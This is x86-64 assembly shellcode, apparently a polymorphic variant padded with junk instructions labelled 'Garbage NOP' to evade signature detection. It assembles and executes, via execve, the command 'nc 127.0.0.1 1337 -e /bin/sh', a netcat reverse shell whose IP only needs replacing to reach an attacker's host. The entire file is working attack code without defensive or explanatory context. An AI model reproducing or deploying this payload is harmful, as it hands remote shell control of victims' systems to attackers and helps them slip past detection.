global _start

_start:

xor    	rdx,rdx
nop                                                 ; Garbage NOP
nop                                                 ; Garbage NOP
mov 	rdi,0x636e2f6e69622fff
shr	rdi,0x08
dec al                                              ; Garbage NOP
push 	rdi
mov 	rdi,rsp

mov	rcx,0x68732f6e69622fff
shr	rcx,0x08
dec al                                              ; Garbage NOP


push 	rcx
inc cl                                              ; Garbage NOP
dec cl                                              ; Garbage NOP
mov	rcx,rsp

mov     rbx,0x652dffffffffffff
std                                                 ; Garbage NOP
cwd                                                 ; Garbage NOP
shr	rbx,0x30

cmc                                                 ; Garbage NOP

push	rbx
mov	rbx,rsp

mov	r10,0x37333331ffffffff
shr 	r10,0x20
std                                                 ; Garbage NOP
push 	r10
mov	r10,rsp

jmp short ip
continue:
pop 	r9

push	rdx  ;push NULL

push 	rcx  ;push address of 'bin/sh'
nop                                                 ; Garbage NOP
inc dl                                              ; Garbage NOP  
dec dl                                              ; Garbage NOP

push	rbx  ;push address of '-e'
inc cl                                              ; Garbage NOP
dec cl                                              ; Garbage NOP
nop                                                 ; Garbage NOP
push	r10  ;push address of '1337'

dec al                                              ; Garbage NOP

push	r9   ;push address of 'ip'

inc bl                                              ; Garbage NOP
dec bl                                              ; Garbage NOP

push 	rdi  ;push address of '/bin/nc'

nop                                                 ; Garbage NOP
mov    	rsi,rsp
mov al, 59

syscall

ip:
	call  continue
	db "127.0.0.1"
